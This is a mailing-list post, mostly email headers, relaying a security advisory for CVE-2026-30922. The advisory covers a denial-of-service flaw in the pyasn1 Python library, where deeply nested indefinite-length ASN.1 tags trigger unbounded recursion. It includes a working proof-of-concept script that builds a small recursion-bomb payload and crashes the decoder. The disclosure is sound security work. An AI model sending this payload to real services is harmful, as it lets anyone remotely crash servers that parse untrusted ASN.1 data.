Received: (qmail 22301 invoked by uid 550); 20 Mar 2026 22:46:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 22209 invoked from network); 20 Mar 2026 22:46:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
	content-transfer-encoding:content-type:date:from:message-id
	:mime-version:subject:to; s=corp-2025-04-25; bh=YU/zSbOMSJRgU/dX
	ZMDZemUMrRTkG6fCYeqtuFYByjU=; b=aV9dOUn5EJuw0jtQai1BAtiTABbFP4yY
	qEUfYlNI9uozmCjvb8Ki7YjgqNQKFGiNAeHFyMb7E0o9122C7AoYI1izhHTz+GhF
	IsVZnj7DHwOKt9+4tPo6Zg5SZVz3YOuQWIpPRP+MYm6RTZ2zF4YFZCsHL2Q2j3f3
	8mmAFRENRb8Nt2e0xLzBGbol/yp4oV1VISIGwCATmq+vb7ennRWkJZ9m1lV7p490
	l7WWOT/lRDcbJkq4EWiLN4m6DUsc4MSdLo88K/HGeU6xMvLO27PKcCkGChF2MtLF
	GdBJN78C2rX+5JmlmIJQNdPMU9+HHelIJbKsvm0aAvLFAkZ2Z1xdPA==
ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
 b=RHfMkYg1/BwI8QcF/Ov8f53b8cXoWWiy+XmihehsuUHgzdLwhJTYz42UHlG/pA7zQ3UiFZ8ems6EXt90Rsm+T6DxI7cLigE2m0rTIkcFBb+lmvB/aq2EhE7XKVlQ7ZKYVc6hq5+/OLwMlyKtUNR1bHhdRNJvtQUodG8L2DLQJV5lUkDhoMkIwWjlrnx4ON0R6m1+ztIDTZTY6q+EjUH5CWLEQjgFUp15Xyk0/lOJoprR7E/C1xogFotvPItCBFfEGGIR62XFUCuuF1KWQwR7+X59jba5+ij4vPJJP68t8cpOPM0SAfBb2vrGgtOOVtQE9IypFHdtXrK1V4hyoxff6Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector10001;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=YU/zSbOMSJRgU/dXZMDZemUMrRTkG6fCYeqtuFYByjU=;
 b=DuVNbWJfVivjEF2o+GKF3nmkvpyIERH0hPjBxNWdlx23G65VciqGMuDGoxu6UJuS7vdXBJK9thZLFtPODa+fScFVxHbWYGmyaAfsoaiWodjmerZH9wuLnEKElkwsDfaz5lBJUXcVQN4EUTTcOVbN5YRruIvFH/STJoF19C7fkYXmb7aiEDE84c/1N2xLUb/WrjN1iXKXVju1qH2JmrvlAl2kkj7HlVbadZqGdOOolsFY8Wjw0BiSmOwDIWbd6V8m7VeOOu/fKnDqXz5FQ6I/018QSp191Hr9Yxlq32Pv71GQmD8kEx8reMnx/lE06lmM3yZdnbgHwK05TyAlSxpyhA==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=YU/zSbOMSJRgU/dXZMDZemUMrRTkG6fCYeqtuFYByjU=;
 b=uEDOYKTEBcGqJPHcNMQttUbxwjcs7RiI1ew+r4yygvj2XIyXsNwc6FQlqe2tJ1gvvBFfyi7krubZcBoGkTuRewe5QWdIm2DUTjB2vokGjfDMvgjuXT+nYzYufjwX3AJstKaB0HIhZUMYsg6BFUuGE3f+7V9pointszD73EpTEio=
Message-ID: <466a5378-d9bc-4119-bc49-e0b1fd08b865@oracle.com>
Date: Fri, 20 Mar 2026 15:45:54 -0700
User-Agent: Mozilla Thunderbird
Content-Language: en-US
From: Alan Coopersmith <alan.coopersmith@oracle.com>
To: oss-security@lists.openwall.com
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 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
 5V9JclVH6u5Gug==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: BYAPR03CA0030.namprd03.prod.outlook.com
 (2603:10b6:a02:a8::43) To IA1PR10MB6736.namprd10.prod.outlook.com
 (2603:10b6:208:42c::9)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: IA1PR10MB6736:EE_|CY8PR10MB7241:EE_
X-MS-Office365-Filtering-Correlation-Id: 0bec9e7b-fe73-4ca0-3ef0-08de86d2740b
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam:
	BCL:0;ARA:13230040|366016|1800799024|376014|18002099003|56012099003;
X-Microsoft-Antispam-Message-Info:
	NiJ31oOEUBcGysToDu0UFet0TCFQ/i6W2fSf9YCMafuulNgAQxlmuzH4Omfg/0aJx70B6d87nlBvUIH2XvDYmbswHdjipbMSyQqCNYF0rrWs8I4NxkqNKDphKLzJ0SBE0tzXGNgTqP8x+VBVst8FMW6VbS0FGK0saJYQs7EjF2zGwG+E94nQV1rNmUYIflJuRUtLPBSgIgoZLU4tNW4Olym6dDzCPuAC2q6AUzXXGyThqo2ywu2ydip/TKBKVg4HtE4qZdMkonEjNSTvtM/WUoYwhC07/GyfzFb+l19mUweOBXfSnF2jonGyKFqNQv9hkJ5xA8VSmxXZIdaZPDLqOzWCva2ufi2OxRQeboIzE513JecbyNyHEVR19HPs2Wt/uN7r5UEb23qvtKAaLBKkETZpk4UHVy/U+1z3XlH9RE4tyIHGuIGhM6Qfr9cS+KNxmeTJi5ePzcMJxND/+DqXgXgPerhCUH22iGIovLyxzdukHPGZwifNQePkejb/LJgb8wEQKZfBOkLHofaoqnLl+PNentlmSjfMDsbeTzjwKzIUy2rLhpn87+a2GtK6WFw8zIhIkNqnozzVaUOU1FnlT6x4ucRrRR1d9mHI59EPofCO5S78z3h6jiyAnZTDJ7/TThcLlN1Rpl7/J+vErhbNhPc7On6NeG28zktGTUew5e++1oyDJx6neNg99hyfx92b
X-Forefront-Antispam-Report:
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA1PR10MB6736.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(1800799024)(376014)(18002099003)(56012099003);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0:
	=?utf-8?B?T2diMmhSbk5xRi9aVWJrZlZSNFFVaDFWdlJxQjM4Rm1sTURhYzBVYjVHSGdI?=
 =?utf-8?B?UFRBNHc5UWY1NnUrbE1tSi9RZ0gwR25Lb2xmajNJNkxCdXBTSURoMnBxNncz?=
 =?utf-8?B?T3NQTE00RWoveDlVSGJzb3lOTU9mUmN0VE5TQmVWNVFLVlhqZWwweFd1SVhT?=
 =?utf-8?B?azFFUzdVS0ExU0N6b2JYd04xWDVHNXVXUkdMYlRSclVVZUwyNUtVRytnclMw?=
 =?utf-8?B?RUliVTBHT0t6b3lVU1hGYlYxa2lTK3RHZTFnV1JQMk00N1FqMWkwb21oUTBt?=
 =?utf-8?B?WGJ2bFZ5dzhrc0Q2U1VTSm92M1l5ZjczdGRYTnJsS1BiOEFITmNlbGMxNERO?=
 =?utf-8?B?aVp0eHdVZkpxT0lPdlR2cmcwZkViblRUejBZR1QwYm5ETEwxZ2VnNSthQ1JF?=
 =?utf-8?B?dkxkaEgzSXkzSlFtZjVuVktrKzhaYUovd3V0UHRwWGUzaWdXQmc5OWlyWlFT?=
 =?utf-8?B?Uno3Y1hOdzc1WnZGQ0R3QjRYeE1DaG1qejAvaGpMaTZSV1VtRVZOMGMwUFky?=
 =?utf-8?B?SHNQWktBREZDckNGVzRxZU9nbVRyUmF3eDhkSExRZ3pBVHhWemZINndHdnRj?=
 =?utf-8?B?d0E3eVpmbzgzWTJvcU5TUitQaXM1aE5hZDJMaW9ub29VaC9KeWhlOVhzMTZL?=
 =?utf-8?B?VDV6OWw0UEY2ZERRNGRlQXJLUXFVMHRzdlkxaXYyZ21IMTMrVmZpMy93Yk16?=
 =?utf-8?B?Y0txT1F3bWo1UFdETTJUTmhTempDSWdhSDN4Um55WmcyU1FWeE5qWTBKaG5R?=
 =?utf-8?B?V2FqdDhFa0Q5RVFTMERxc2tlYXFQV2hubFRyMHpTZDFtbWJ1ZGVqTjY1ZElD?=
 =?utf-8?B?RkdMQWV5RklCcTh2R29uclkxTjc5YlJCUUQ1MHV6SHVuRGVGS2llUjdLdnU3?=
 =?utf-8?B?eWpBWmMzK1Q2V3RhUGNJc216S3N3cjlOM2E0cE95UU84dnRKSnJuZEZYcTUv?=
 =?utf-8?B?TjIrUTVPd0QrTDdDNDVvZEQ5RThYVDlRWU1hbXgwSy81Nzduc0Fqa25hbEIx?=
 =?utf-8?B?SkdWNlJ2ZERKSTVJQzVscnlubGlJOXlGOEl5UklQN01Zc3VMUHVudkVQbzVX?=
 =?utf-8?B?MGIxNURJdE5hdXlXWEJ5ZmZ1ZkNxc2kzM3B2cDRnMGhyMytMcjVWU1lPa3hV?=
 =?utf-8?B?aUFoWm5iTE5iejBjNzFWZDE4UEtYWWlPSVZFMnFyaGJPWjlqc0c1RFZwREpY?=
 =?utf-8?B?RUhZclllcEEyRTBvR3ZsVTV3bEM1ODAzd21tVmN4WkJkeDlMaXpxbjNNVnpN?=
 =?utf-8?B?dHZmNWc2OGxKcWM0Mi9DSGh0MVNVMjJ2M2xxM0ZDdStISEk1bU4yVEJrL2tI?=
 =?utf-8?B?TW1nNy9qUno3VWVkRXdWU254clY3VjIrR0dWOU9JbTBLMzlRMU94VG52VVVH?=
 =?utf-8?B?T0tvTUl3QjVzNnhKaDgva0MyVDlkci9iODY0Mi9EcHRJbjFqQzVmeklrcUY0?=
 =?utf-8?B?YUExRHlMMFdJV1FadWMwemlkdjBIa3VDUk9scDlnS0wrK1IvVC9VT2dFYW8x?=
 =?utf-8?B?NzMzTHpwWXdyZEM2bVhnMjZOalJxUVZlTVRzbExTUWZjbTVSZUNkTklIb3VU?=
 =?utf-8?B?eUF4R0JFVGl2WElaVU1xbGdZaGI4UUJiczYxRU5hWU9uUlBJSVVFZG5kUElE?=
 =?utf-8?B?VzFISGx1MWNWcTVsTnlRb3A2bGxFd0EyV0ZHVC9SQm9lSnB0UHZTOEtpUUU1?=
 =?utf-8?B?VVBocWluK0IwbEEzVmx3SVZxa0FqTkJrbHZUMmE3UnJyVVRRTlBVTUkzR1JC?=
 =?utf-8?B?QmlZU2d5NG9uVjErSk1XOXdFN2xyLzc2cnNxK095UktIb292SkkvbnlHTC94?=
 =?utf-8?B?NVAxNkwweUIxdlhDbXVuMHAvd3RkUHUzeXQ1OHhHL2NJa3JUZnc5K0tQNlBM?=
 =?utf-8?B?ek4xRmRMemU4OHNOYkNLeU96cTIwWCtGQW9Ld0hGTTdPWXRsQUxhaW9XYlNU?=
 =?utf-8?B?RUU2NmVyMUpNN1ZqMmQrZmIxbDAwM2pLWSs4R1FvajU5MUc0YXN6eWM4QW9H?=
 =?utf-8?B?L3Vockc4NGxoaEt5VGo0Tm5TczFUSGp3ZE9IY0g4Qy9kUUc1SThybVhYbk5P?=
 =?utf-8?B?UWdQK1EzRnNVM1ZMRTk3aGc4d0tCWUpFazNNYjdBczZFdVRuaGJyT3F6MFJC?=
 =?utf-8?B?MnpZMzU4dU5JQ2toYmVORmF1YmNBbWMwaFFlTHplenhXd2Y0TDFrNlErelFB?=
 =?utf-8?B?cTJ5NjJPNlBkMHdzeXZQb1ppeDJSblBPVVVMTm9zbmxqeFRYS29iYWVUYjNh?=
 =?utf-8?B?SE9KVEdINXdkYWducmIwT2N1dzJ4RVdOWWxNL0hTTG5IV3hnSEZvWWYvVXFp?=
 =?utf-8?B?a0RQUUl6TFhrSEJkcWRsVElEcE52VnpCOHdwNU1XYlc2dkVmU1dFS2NIeDQ3?=
 =?utf-8?Q?+hcLtAGv401/qqtU=3D?=
X-Exchange-RoutingPolicyChecked:
	Jl7N3vuFvvujM7tLGD1jZD7Qrb1hT36MmWaR8A55n1okieER2JdfOdJSsbg/ossc+u5q1wN5EAjnqqYvQegs1WipeE2JGCXpeZoD6M7QROgcAWX9XmP7Az/r0KbuiQI4KWalbDk3dVsSgdyj2xEzq4D2nXoMfRLITNl7G1+08vFwhRWJ8hzuAYh+F32eru2vML9dbMPL1jL4zYNJNTJvPQPNjjXbSELIWiGQxRPB0tSMAYS2bnG24JNf5jkvsFNvb005M1vhmbzzf/WcaTDMpIJ90ea1FiYz1wNbp14//AD6N6aVZq1gb3XJbeuM6a59z1x1rAQXAG4A7e2AssQ7qw==
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
	j3KkKn8Fc19qbq3BmIy5Njbmp+yM9k4SviIcbV8gVopgPWRd9lLq5a3n6xjXGjepY1uVDXyRkp9LBuiIElyapWy/TQZNh4uncEtGCM4lkSdXB4GsKnW8k+M8K7UU2hqnGYfruSQ5/rfwU2wyEsjZoUnAnHgCi8ccNAcNS+ykNaFoY4Fzn0WkY+lfpMgemHffgOgUNchAiC/ENEpYvNn4GM9NyaW2Ew8V8j2Sh1ltlF3SizEy91NeXlGu3Q5eIy2qnpB4RidqA/RKaEyrzhiLA21UZb8mP0EsMSqUiWQWPTwr8wJtqrEAe+GuBlqtz9VFkiSXjV80Nc6BzCZWS8XNv7UUUKrRtUW63bbbFkjIv4DHNwyGw6EG61HY8SADR/CNpVgzLTykYM3iSRTlpewXjbo/M4v2/MTSCYm6nCW4qmHyeiManwTTFMdO1duIYbUN8X2KiIWNw41cnjDf0Z2rsRaU4Co76lTSNVLjdouDlNjUVkJzj9WjDDTcdaCi7/ETvX1VJMuUXH5Apd3In/iUNr3VqEvaRs9H4vNwynq3vK36lMwWIDLjsPwXKMWfxW9AsEtFqhf44rfKHKCsjb84VoqkQv2MT/ssSmStnjJ4M9A=
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: 0bec9e7b-fe73-4ca0-3ef0-08de86d2740b
X-MS-Exchange-CrossTenant-AuthSource: IA1PR10MB6736.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 20 Mar 2026 22:45:58.4763
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: xtC68xehv20OzUMG7qhTD9dETcKaky29+jCYIf77CR/a5zQ/P+ghFu/ICQOzg8gX5Hg4LmYIGCHMKlL7YRzCH8SSMOQC/Vy8OkXv2CZmKag=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: CY8PR10MB7241
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
 definitions=2026-03-20_04,2026-03-20_02,2025-10-01_01
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 mlxscore=0 mlxlogscore=999 phishscore=0
 suspectscore=0 spamscore=0 adultscore=0 malwarescore=0 bulkscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2603050001
 definitions=main-2603200187
X-Authority-Analysis: v=2.4 cv=HcsZjyE8 c=1 sm=1 tr=0 ts=69bdce2c b=1 cx=c_pps
 a=WeWmnZmh0fydH62SvGsd2A==:117 a=WeWmnZmh0fydH62SvGsd2A==:17
 a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=z/mQ4Ysz8XfWz/Q5cLBRGdckG28=:19
 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10
 a=Yq5XynenixoA:10 a=GoEa3M9JfhUA:10 a=VkNPw1HP01LnGYTKEx00:22
 a=jiCTI4zE5U7BLdzWsZGv:22 a=7Gl3-_t3PgB9XO-mQDs3:22 a=NEAV23lmAAAA:8
 a=66IWMPfqs14VXRS8niwA:9 a=QEXdDO2ut3YA:10
X-Proofpoint-ORIG-GUID: J8P7osqaRi-ml6qg81xqLDIuDJMj5oSm
X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwMzIwMDE4NyBTYWx0ZWRfX5MJL5zuvpK8W
 ujUFJOBn/bgGznLUmsYSlw9Yj0wbfDXBDzWr1nLq98QpdoMM6IAtK0Z50o3FU4+c2cgtCSpmAzr
 SCwmizgqAegk7ymH7S6oVd+Fb1MFNPl5z1gGQxj3du3ytKMPjF+PrIY3EkYE47yu/F4VyiEHums
 LHCGuhUjXDlmhyihuSIPZBaY8jQIjY8LZ/tX25PUHTs9NLxMEJPxb/LcaNW/s9+lUTRgYWkUfxZ
 aHHk+KGGro/Wyys+uV4kl3K975pTZiljlgX8j5POpcwyxzTI+BuhKP0Vm31szs0leO/CCh+OS2U
 avwch1Yt1gZ7Q/KKcg1OMyOmnh4nNU2iDxwh1FQe0a680hg6vWQILHCF+rEq6gi1jCWJFYX5Bym
 4grJX6nU9i1xuTiQwOjhLt0D+G6xxMsAjDzTU0E1wYIqMEgZfOMxgzQBYCztq+LuyUtfu/8cBjB
 ZI76rd3SeoVrah7qjhQ==
X-Proofpoint-GUID: J8P7osqaRi-ml6qg81xqLDIuDJMj5oSm
Subject: [oss-security] [CVE-2026-30922] Denial of Service in pyasn1 via
 Unbounded Recursion

https://github.com/pyasn1/pyasn1/security/advisories/GHSA-jr27-m4p2-rc6r reports:
> Package:                pyasn1 (pip)
> Affected versions:      <= 0.6.2
> Patched versions:       0.6.3
> 
> Summary
> -------
> The pyasn1 library is vulnerable to a Denial of Service (DoS) attack
> caused by uncontrolled recursion when decoding ASN.1 data with deeply
> nested structures. An attacker can supply a crafted payload containing
> nested SEQUENCE (0x30) or SET (0x31) tags with Indefinite Length
> (0x80) markers. This forces the decoder to recursively call itself
> until the Python interpreter crashes with a RecursionError or consumes
> all available memory (OOM), crashing the host application.
> 
> Details
> -------
> The vulnerability exists because the decoder iterates through the
> input stream and recursively calls decodeFun (the decoding callback)
> for every nested component found, without tracking or limiting the
> recursion depth.
> 
> Vulnerable Code Locations:
> 
>  1. indefLenValueDecoder (Line 998):
>     for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):
>     This method handles indefinite-length constructed types. It sits inside a
>     while True loop and recursively calls the decoder for every nested tag.
> 
>  2. valueDecoder (Lines 786 and 907):
>     for component in decodeFun(substrate, componentType, **options):
>     This method handles standard decoding when a schema is present.
>     It contains two distinct recursive calls that lack depth checks:
>     Line 786: Recursively decodes components of SEQUENCE or SET types.
>     Line 907: Recursively decodes elements of SEQUENCE OF or SET OF types.
> 
>  3. _decodeComponentsSchemaless (Line 661):
>     for component in decodeFun(substrate, **options):
>     This method handles decoding when no schema is provided.
> 
> In all three cases, decodeFun is invoked without passing a depth parameter or
> checking against a global MAX_ASN1_NESTING limit.
> 
> PoC
> ---
> import sys
> from pyasn1.codec.ber import decoder
> 
> sys.setrecursionlimit(100000)
> 
> print("[*] Generating Recursion Bomb Payload...")
> depth = 50_000
> chunk = b'\x30\x80'
> payload = chunk * depth
> 
> print(f"[*] Payload size: {len(payload) / 1024:.2f} KB")
> print("[*] Triggering Decoder...")
> 
> try:
>     decoder.decode(payload)
> except RecursionError:
>     print("[!] Crashed: Recursion Limit Hit")
> except MemoryError:
>     print("[!] Crashed: Out of Memory")
> except Exception as e:
>     print(f"[!] Crashed: {e}")
> 
> [*] Payload size: 9.77 KB
> [*] Triggering Decoder...
> [!] Crashed: Recursion Limit Hit
> 
> Impact
> ------
>  - This is an unhandled runtime exception that typically terminates the
>    worker process or thread handling the request. This allows a remote attacker
>    to trivially kill service workers with a small payload (<100KB), resulting in
>    a Denial of Service. Furthermore, in environments where recursion limits are
>    increased, this leads to server-wide memory exhaustion.
> 
>  - Service Crash: Any service using pyasn1 to parse untrusted ASN.1 data
>    (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely.
> 
>  - Resource Exhaustion: The attack consumes RAM linearly with the nesting depth.
>    A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust
>    the stack.
> 
> Credits
> -------
> Vulnerability discovered by Kevin Tu of TMIR at ByteDance.
> 
> Severity
> --------
> High
> 7.5 / 10
> CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
> 
> CVE ID
> ------
> CVE-2026-30922
> 
> Weaknesses
> ----------
> CWE-674
> 
> Credits
> -------
>     @romanticpragmatism Reporter
